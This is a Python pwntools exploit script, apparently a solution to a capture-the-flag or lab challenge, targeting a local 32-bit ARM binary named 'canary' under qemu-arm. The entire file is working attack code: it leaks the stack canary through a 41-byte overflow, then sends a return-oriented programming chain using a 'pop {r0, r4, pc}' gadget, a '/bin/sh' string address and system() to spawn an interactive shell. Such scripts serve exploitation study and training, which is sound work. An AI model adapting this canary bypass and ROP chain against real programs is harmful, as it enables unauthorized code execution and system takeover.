from pwn import *

context.arch = "arm"
context.bits = 32
context.endian = "little"
context.os = "linux"

target = process(["qemu-arm", "./canary"])

# arm-none-eabi-objdump -D canary | grep libc_system
# 00016d90 <__libc_system>:
system_plt = 0x16D90
# .rodata:00071EB0  aBinSh  DCB "/bin/sh",0  ; DATA XREF: do_system+464↑o
bin_sh_addr = 0x71EB0

# ROPgadget --binary ./canary | grep pop | grep r0 | grep pc
# 0x00026b7c : pop {r0, r4, pc}
pop_r0_r4_pc = 0x26B7C


# .text:000104B8     ; int __fastcall main(int argc, const char **argv, const char **envp)
# .text:000104B8                     EXPORT main
# .text:000104B8     main                                    ; DATA XREF: _start+20↑o
# .text:000104B8                                             ; .text:off_103B0↑o
# .text:000104B8
# .text:000104B8     var_30          = -0x30
# .text:000104B8     var_8           = -8
# .text:000104B8     var_4           = -4
# .text:000104B8
# .text:000104B8 000                 PUSH            {R4,R5,LR}
# .text:000104BC 00C                 SUB             SP, SP, #0x34
# .text:000104C0 040                 MOV             R3, #__stack_chk_guard
# .text:000104C8 040                 LDR             R3, [R3]
# .text:000104CC 040                 STR             R3, [SP,#0x34+var_8]
# .text:000104D0 040                 MOV             R3, #stdout

target.recvuntil(b"> ")
target.send(b"A" * 41)
target.recvuntil(b"A" * 41)
canary_leak = target.recv(3)

canary = u32(b"\x00" + canary_leak)
log.success(f"Successfully leaked ARM Stack Canary: {hex(canary)}")
target.recvuntil(b"> ")

padding = b"A" * 40
saved_stack = b"B" * 12

payload = flat(
    padding,
    p32(canary),
    saved_stack,
    pop_r0_r4_pc,
    bin_sh_addr,
    0,
    system_plt,
)

target.sendline(payload)
target.sendline(b"")
log.success("ARM Canary bypassed! ROP chain executed successfully.")
target.interactive()
